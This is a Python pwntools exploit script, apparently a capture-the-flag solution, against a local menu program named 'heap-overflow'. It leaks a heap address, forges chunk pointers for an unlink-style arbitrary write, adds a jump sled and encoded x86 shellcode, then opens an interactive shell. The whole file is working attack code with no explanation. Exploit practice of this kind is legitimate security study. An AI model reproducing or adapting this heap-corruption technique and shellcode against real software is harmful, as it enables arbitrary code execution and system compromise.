from pwn import *
p=process('heap-overflow')

print p.recv()
p.send("1\n")
print p.recv()
p.send("title\n")#Title
print p.recv()
p.send("type\n")#Type
print p.recv()
p.send("content\n")#Content
print p.recv()

p.send("3\n")
print p.recv()
p.send("title\n")
location=p.recv()
print location
location=location.split(':')[2]
location=location.split('\n')[0]
location=int(location,16)
print location

p.send("4\n")
print p.recv()
p.send("title\n")
p.recv()

shellcode=p32(location+108)
shellcode+=p32(0x0804a448)
shellcode+=p32(location+108+12)
shellcode+="\x90\x90\xeb\x04"
shellcode+="AAAA"
payload="\xd9\xed\xd9\x74\x24\xf4\x58\xbb\x17\x0d\x26\x77\x31"
payload+="\xc9\xb1\x0b\x83\xe8\xfc\x31\x58\x16\x03\x58\x16\xe2"
payload+="\xe2\x67\x2d\x2f\x95\x2a\x57\xa7\x88\xa9\x1e\xd0\xba"
payload+="\x02\x52\x77\x3a\x35\xbb\xe5\x53\xab\x4a\x0a\xf1\xdb"
payload+="\x45\xcd\xf5\x1b\x79\xaf\x9c\x75\xaa\x5c\x36\x8a\xe3"
payload+="\xf1\x4f\x6b\xc6\x76"
shellcode+=payload

print(''.join((r'\x%2x'%ord(c)for c in shellcode)))
print "\n"+shellcode+"\n"
p.send(shellcode+"\n")
print p.recv()

p.send("5\n")
print p.recv()
input=hex(location+108)
input=input.split('x')[1]
p.send(input+"\n")
print p.recv()
p.interactive()
